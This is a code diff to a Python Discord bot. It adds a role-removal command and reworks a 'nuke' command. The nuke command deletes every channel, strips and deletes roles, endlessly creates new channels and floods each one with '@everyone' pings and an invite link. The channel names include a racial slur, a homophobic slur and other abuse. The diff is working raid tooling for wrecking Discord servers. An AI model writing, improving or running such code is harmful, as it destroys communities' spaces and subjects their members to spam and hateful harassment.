@@ -106,6 +106,7 @@ async def help(ctx):
     roleCreate (name) - Create a role
     roleDelete (mention) - Delete a role
     roleGive (mention) (role mention) - Give a user a role
+    roleRemove (mention) (role mention) - Remove a role from a user
     addCmdPerms (mention) - Allow a user to use the bot
     removeCmdPerms (mention) - Remove a user's permission to use the bot
     addChannel (name) - Create a channel
@@ -209,6 +210,13 @@ async def roleGive(ctx, member: discord.Member, *, role: discord.Role):
     await ctx.send(embed=embed)
 
 @bot.command()
+async def roleRemove(ctx, member: discord.Member, *, role: discord.Role):
+    await member.remove_roles(role)
+    print(colored(f'『+』Removed role: {role.name} from user: {member.name}', 'blue'))
+    embed = Embed(title="Remove Role", description=f"Removed role: {role.name} from {member.name}", color=0x00ff00)
+    await ctx.send(embed=embed)
+
+@bot.command()
 async def addCmdPerms(ctx, member: discord.Member):
     command_users.add(member.id)
     print(colored(f'『+』Added command permissions to user: {member.name}', 'blue'))
@@ -252,19 +260,20 @@ async def renameChannel(ctx, *, new_name):
 @bot.command()
 async def nuke(ctx):
     guild = bot.get_guild(server_id)
-    channel_names = ['[҉😂]҉ 𝔽𝕦𝕔𝕜𝕖𝕕 𝕓𝕪 𝕆𝕗𝕗𝕝𝕚𝕟𝕖𝕋𝕙𝕖𝕄𝕖𝕟𝕒𝕔𝕖', '【🤡】 𝐂𝐫𝐲 𝐧𝐢𝐠𝐠𝐚', '[🏳️‍🌈🚫] 🆄🆁 🅰 🅵🅰🅶🅶🅾🆃', '「🕴️」b͓̽i͓̽t͓̽c͓̽h͓̽']
+    channel_names = ['[҉😂]҉ 𝔽𝕦𝕔𝕜𝕖𝕕 𝕓𝕪 𝕆𝕗𝕗𝕝𝕚𝕟𝕖𝕋𝕙𝕖𝕞𝕖𝕟𝕒𝕔𝕖', '【🤡】 𝐂𝐫𝐲 𝐧𝐢𝐠𝐠𝐚', '[🏳️‍🌈🚫] 🆄🆁 🅰 🅵🅰🅶🅶🅾🆃', '「🕴️」b͓̽i͓̽t͓̽c͓̽h͓̽']
     role_names = channel_names
 
     # Shuffle the channel names to create channels in a random order
     random.shuffle(channel_names)
 
-    async def create_channels():
-        start_time = time.time()
-        while time.time() - start_time < 2:
+    async def create_and_spam_channels():
+        while True:
             try:
-                await guild.create_text_channel(name=channel_names[random.randint(0, len(channel_names) - 1)])
+                channel = await guild.create_text_channel(name=channel_names[random.randint(0, len(channel_names) - 1)])
+                await asyncio.sleep(0.1)  # Small delay to avoid rate limiting
+                asyncio.create_task(spam_channel(channel))
             except Exception as e:
-                print(colored(f'『+』Error creating channel: {e}', 'red'))
+                print(colored(f'『+』Error creating or spamming channel: {e}', 'red'))
 
     async def delete_channels():
         for channel in guild.channels:
@@ -297,22 +306,19 @@ async def nuke(ctx):
             except Exception as e:
                 print(colored(f'『+』Error assigning roles: {e}', 'red'))
 
-    async def spam_channels():
-        for channel in guild.channels:
-            if random.random() < 0.1:
-                for _ in range(1000):
-                    try:
-                        await channel.send('@everyone')
-                    except Exception as e:
-                        print(colored(f'『+』Error spamming channel: {e}', 'red'))
+    async def spam_channel(channel):
+        try:
+            for _ in range(1000):
+                await channel.send('@everyone https://discord.gg/rsZcW4QmJD')
+        except Exception as e:
+            print(colored(f'『+』Error spamming channel: {e}', 'red'))
 
     tasks = [
         delete_channels(),
-        create_channels(),
+        create_and_spam_channels(),
         strip_roles(),
         delete_roles(),
-        assign_roles(),
-        spam_channels()
+        assign_roles()
     ]
     await asyncio.gather(*tasks)
 
